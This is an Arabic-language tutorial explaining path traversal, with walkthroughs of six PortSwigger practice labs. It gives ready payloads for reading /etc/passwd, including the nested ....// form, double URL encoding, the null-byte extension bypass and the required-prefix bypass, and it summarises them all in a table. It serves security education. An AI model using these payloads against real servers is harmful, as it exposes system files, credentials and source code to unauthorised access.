

---

# ثغرة الـ Path Traversal — Directory Traversal
## الشرح الكامل + كل الـ Labs بتاعة PortSwigger

---

## أولاً: الفكرة العامة

الشرح ده بيغطي ثغرة الـ Path Traversal من الصفر — إيه هي، ليه بتحصل، إزاي بتشتغل، وكل الطرق اللي الموقع ممكن يحاول يحمي بيها نفسه مع إزاي بنتجاوزها. وده بالظبط اللي اتعمل في الـ Labs بتاعة PortSwigger.

---

## ثانياً: اللي المفروض تاخده من الشرح ده

- تفهم إيه الـ Path Traversal وليه بتحصل
- تعرف تقرأ الـ File System وتتنقل فيه
- تعرف تنفّذ الهجمة في حالاتها الستة المختلفة
- تعرف تتجاوز كل نوع من أنواع الحماية

---

## ثالثاً: الشرح الكامل بالعربي

---

### 📌 الجزء الأول: الـ File System — لازم تفهمه الأول

قبل ما نتكلم عن الثغرة، لازم تفهم إزاي الـ Server بيخزّن الملفات.

السيرفر — سواء Linux أو Windows — بيخزّن ملفاته في **شجرة مجلدات** (Directory Tree — ديركتوري تري). زي شجرة من فوق لتحت.

**في Linux:**
```
/                        ← الجذر — Root Directory
├── etc/                 ← إعدادات النظام
│   └── passwd           ← ملف فيه أسماء المستخدمين
├── var/
│   └── www/
│       └── images/      ← المجلد اللي الموقع بيجيب منه الصور
│           ├── 1.png
│           ├── 2.png
│           └── 218.png
└── home/
    └── user/
```

**في Windows:**
```
C:\
├── Windows\
├── Users\
└── inetpub\
    └── wwwroot\         ← ملفات الموقع
```

---

#### المسارات — Absolute Path vs Relative Path

ده أهم حاجة هتستخدمها في الهجمة:

**الـ Absolute Path (أبسوليوت باث) — المسار المطلق:**
بيبدأ من الجذر مباشرة. يعني عنوان كامل من أول `/`
```
/etc/passwd
/var/www/images/218.png
```

**الـ Relative Path (ريلاتيف باث) — المسار النسبي:**
بيبدأ من المكان اللي أنت فيه دلوقتي. بيستخدم `../` يعني "ارجع مجلد واحد للخلف".

لو أنت في `/var/www/images/`:
```
../           →  يوصّلك لـ /var/www/
../../        →  يوصّلك لـ /var/
../../../     →  يوصّلك لـ /   (الجذر)
../../../etc/passwd  →  يوصّلك لـ /etc/passwd
```

> **قاعدة ذهبية:** كل `../` بترجّعك مجلد واحد للأعلى.

---

### 📌 الجزء الثاني: إيه هي ثغرة الـ Path Traversal؟

**الـ Path Traversal** (باث تراڤيرسال) — اسم تاني: **Directory Traversal** (ديركتوري تراڤيرسال) — هي ثغرة بتخلي المهاجم يقرأ أي ملف على السيرفر خارج المجلد المسموح بيه.

**إزاي بتحصل؟**

موقع بيعرض صور المنتجات هكذا:
```html
<img src="/loadImage?filename=218.png">
```

الـ `filename` ده **Parameter** (براميتر) — قيمته بتتبعت للسيرفر. السيرفر بياخد القيمة دي ويفتح الملف:
```
/var/www/images/218.png
```

لو الموقع **مش بيفحص** قيمة الـ `filename` — المهاجم يقدر يكتب بدل `218.png`:
```
../../../etc/passwd
```

السيرفر هيفتح:
```
/var/www/images/../../../etc/passwd
```
اللي بيساوي:
```
/etc/passwd
```

والمهاجم بيشوف محتوى الملف ده — وفيه أسماء كل المستخدمين على السيرفر.

**إيه اللي ممكن يتسرب؟**
- الـ Source Code بتاع التطبيق
- بيانات اعتماد قواعد البيانات — Database Credentials
- ملفات إعدادات حساسة — Configuration Files
- ملفات النظام زي `/etc/passwd`

---

### 📌 الجزء الثالث: الـ Labs — من الأبسط للأصعب

---

### 🔴 Lab 1 — Simple Case (سيمبل كيس) — الحالة البسيطة

**المشكلة:** الموقع مش عنده أي حماية خالص.

**الـ Request الأصلي:**
```
GET /image?filename=218.png
```

السيرفر بيفتح: `/var/www/images/218.png`

**الهجمة:**
```
GET /image?filename=../../../etc/passwd
```

السيرفر بيفتح: `/var/www/images/../../../etc/passwd` = `/etc/passwd`

**النتيجة:** بيرجّعلك محتوى ملف الـ passwd كاملاً.

**في Burp Suite:**
- بتعمل Intercept للـ Request بتاع أي صورة
- بتروح للـ filename parameter
- بتغيّر قيمته لـ `../../../etc/passwd`
- بتبعته وبتشوف الـ Response

---

### 🔴 Lab 2 — Absolute Path Bypass (أبسوليوت باث بايباس)

**المشكلة:** الموقع بيبلوك `../` — يعني مش بيسمح بالرجوع للخلف. لكنه بيتعامل مع الـ filename كإنه نسبي لمجلد معين.

**محاولة فاشلة:**
```
filename=../../../etc/passwd   ← متبلوك
```

**الحل — استخدام الـ Absolute Path مباشرة:**
```
filename=/etc/passwd
```

بدل ما تقول "ارجع للخلف ووصّلني لـ passwd" — بتقول مباشرة "افتحلي الملف ده بعنوانه الكامل".

**ليه بينجح ده؟** لأن الموقع بلوك `../` بس — ومش بيتحقق إن المسار المطلق خارج المجلد المسموح بيه.

---

### 🔴 Lab 3 — Traversal Sequences Stripped Non-Recursively (ستريبد نون ريكيرسيفلي)

**المشكلة:** الموقع بيشيل `../` من الـ Input — يعني لو كتبت `../../../etc/passwd` بيمسح الـ `../` ويفضل `etc/passwd` اللي مش هيشتغل.

**لكن المشكلة في الشيل:** بيشيلها مرة واحدة بس — **مش بشكل متكرر (Non-Recursively)**.

**الحل — الـ Nested Traversal (نيستيد تراڤيرسال):**
```
filename=....//....//....//etc/passwd
```

**إزاي بيشتغل ده؟**

لما الموقع يشوف `....//` — بيشيل الـ `../` اللي في النص:
```
....//  →  بيشيل ../  →  يفضل ../
```

يعني `....//` بعد الشيل بتبقى `../` — وده بالظبط اللي محتاجه!

**أشكال تانية ممكنة:**
```
..././   →  بعد شيل ../  →  يفضل ../
...\.\   →  في Windows
```

---

### 🔴 Lab 4 — Traversal Sequences Stripped with Superfluous URL-Decode (URL ديكود)

**المشكلة:** الموقع بيشيل `../` **وبعدين** بيعمل **URL Decode** — يعني لو حاولت تعمل URL Encode للـ `../` السيرفر الـ Web Server نفسه بيعمل Decode قبل ما يوصل للتطبيق، والتطبيق بيشيله.

**الحل — Double URL Encoding (دبل URL إنكودنج):**

الـ **URL Encoding** (URL إنكودنج) هي تحويل الحروف الخاصة لكود `%XX`:
```
/  →  %2f
.  →  %2e
```

يعني `../` بـ URL Encoding = `%2e%2e%2f`

لكن الـ Web Server بيعمل Decode أوتوماتيك — فلو بعتّ `%2e%2e%2f` بيبقى `../` قبل ما يوصل للتطبيق واللي بيشيله.

**الحل: Double Encoding — تشفير الـ `%` نفسه:**
```
%  →  %25
```

يعني:
```
../   →  أول Encode: %2e%2e%2f
      →  ثاني Encode للـ %: %252e%252e%252f
```

**الـ Payload:**
```
filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

**إزاي بيشتغل؟**

```
المهاجم يبعت: %252e%252e%252f
Web Server يعمل Decode: 
=%2e%2e%2f   ← التطبيق مش بيشيل ده
التطبيق يعمل Decode: ../            ← بيتنفّذ!
```

---

### 🔴 Lab 5 — Validation of Start of Path (فاليديشن أوف ستارت أوف باث)

**المشكلة:** الموقع بيتحقق إن الـ filename **لازم يبدأ بـ** `/var/www/images` — يعني لو مش بادئ بالمسار ده بيرفضه.

**محاولة فاشلة:**
```
filename=../../../etc/passwd   ← مش بادئ بـ /var/www/images → مرفوض
```

**الحل — ابدأ بالمسار المطلوب وبعدين اعمل Traversal:**
```
filename=/var/www/images/../../../etc/passwd
```

**إزاي بيشتغل؟**

- الموقع يتحقق: "هل بادئ بـ `/var/www/images`؟" ← أيوه ✅
- بعدين السيرفر يفتح المسار كاملاً
- `/var/www/images/../../../etc/passwd` = `/etc/passwd`

---

### 🔴 Lab 6 — Validation of File Extension with Null Byte Bypass (نال بايت بايباس)

**المشكلة:** الموقع بيتحقق إن الـ filename **لازم ينتهي بـ** `.png` أو `.jpg` — يعني لو مكتبش `.png` في الآخر بيرفضه.

**محاولة فاشلة:**
```
filename=../../../etc/passwd   ← مش بتنتهي بـ .png → مرفوض
```

**الحل — الـ Null Byte (نال بايت):**

الـ **Null Byte** = `%00` — ده حرف خاص جداً في البرمجة معناه "نهاية النص". في الـ C وكتير من اللغات، لما السيستم يشوف `%00` — بيوقف القراءة هنا.

**الـ Payload:**
```
filename=../../../etc/passwd%00.png
```

**إزاي بيشتغل؟**

- الموقع يتحقق: "هل بتنتهي بـ `.png`؟" ← أيوه، شايف `...passwd%00.png` ← ✅
- السيرفر لما يفتح الملف: يقرأ `../../../etc/passwd` ← ويوقف عند `%00` ← يتجاهل `.png`
- النتيجة: بيفتح `/etc/passwd` من غير الـ `.png`

---

### 📌 الجزء الرابع: ملخص الحالات والـ Payloads

| الحالة | المشكلة | الـ Payload |
|---|---|---|
| **Simple** | لا يوجد حماية | `../../../etc/passwd` |
| **Absolute Path** | بيبلوك `../` | `/etc/passwd` |
| **Non-Recursive Strip** | بيشيل `../` مرة واحدة | `....//....//....//etc/passwd` |
| **URL Decode** | بيشيل بعد URL Decode | `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd` |
| **Start of Path** | لازم يبدأ بمسار معين | `/var/www/images/../../../etc/passwd` |
| **File Extension** | لازم ينتهي بـ `.png` | `../../../etc/passwd%00.png` |

---

### 📌 الجزء الخامس: في Windows بيختلف إيه؟

في الـ Windows السيرفر بيقبل الاتنين:
```
../   ← زي Linux
..\   ← خاص بـ Windows
```

والملف اللي بنحاول نوصله في Windows:
```
..\..\..\Windows\win.ini
```

---

## رابعاً: نطق المصطلحات الصعبة

| المصطلح | النطق بالعربي |
|---|---|
| Path Traversal | باث تراڤيرسال |
| Directory Traversal | ديركتوري تراڤيرسال |
| Directory Tree | ديركتوري تري |
| Absolute Path | أبسوليوت باث |
| Relative Path | ريلاتيف باث |
| Root Directory | روت ديركتوري |
| URL Encoding | URL إنكودنج |
| Double URL Encoding | دبل URL إنكودنج |
| Null Byte | نال بايت |
| Non-Recursive | نون ريكيرسيف |
| Nested Traversal | نيستيد تراڤيرسال |
| Configuration Files | كونفيجيوريشن فايلز |
| Validation | فاليديشن |
| Bypass | بايباس |

---

## خامساً: قاموس المصطلحات الكامل

| المصطلح | المعنى |
|---|---|
| Path Traversal / Directory Traversal | ثغرة التنقل في المسارات — الوصول لملفات خارج المجلد المسموح بيه |
| Directory Tree | شجرة المجلدات — الهيكل الهرمي لملفات السيرفر |
| Root Directory | المجلد الجذر `/` — أعلى نقطة في الشجرة |
| Absolute Path | مسار مطلق — بيبدأ من الجذر مباشرة |
| Relative Path | مسار نسبي — بيبدأ من المكان الحالي |
| `../` | ارجع مجلد واحد للأعلى |
| Parameter | براميتر — قيمة بتتبعت للسيرفر في الـ URL |
| `/etc/passwd` | ملف Linux فيه أسماء مستخدمي النظام |
| URL Encoding | تحويل الحروف الخاصة لكود `%XX` |
| Double URL Encoding | تشفير الـ `%` نفسه — لتجاوز الـ Decode الأوتوماتيك |
| Null Byte `%00` | حرف خاص معناه نهاية النص — بيخلي السيرفر يتجاهل باقي النص |
| Non-Recursive Strip | شيل `../` مرة واحدة بس — مش بشكل متكرر |
| Nested Traversal | تداخل الـ `../` داخل بعض لتجاوز الشيل |
| Validation | التحقق من المدخلات |
| Bypass | تجاوز الحماية |
| Configuration Files | ملفات الإعدادات الحساسة بتاعة التطبيق أو السيرفر |
| Database Credentials | بيانات الاتصال بقاعدة البيانات |
| Source Code | الكود المصدري للتطبيق |

---

## سادساً: الملخص النهائي

**الـ Path Traversal** ثغرة بتحصل لما موقع بياخد اسم ملف من المستخدم مباشرة — زي اسم صورة — ويفتحه من غير ما يتحقق من المسار. المهاجم بيستخدم `../` عشان يطلع من المجلد المسموح بيه ويوصل لملفات حساسة زي `/etc/passwd`.

**الحالات الستة وتجاوزها:**
- **مفيش حماية** ← `../../../etc/passwd` مباشرة
- **بيبلوك `../`** ← استخدم الـ Absolute Path `/etc/passwd`
- **بيشيل `../` مرة واحدة** ← اعمل Nested `....//` عشان بعد الشيل يفضل `../`
- **بيشيل بعد URL Decode** ← استخدم Double Encoding `%252e%252e%252f`
- **لازم يبدأ بمسار معين** ← ابدأ بالمسار المطلوب وبعدين `/../../../etc/passwd`
- **لازم ينتهي بـ `.png`** ← استخدم Null Byte `passwd%00.png`

---

جاهز للـ Labs العملية لما تقول. 💪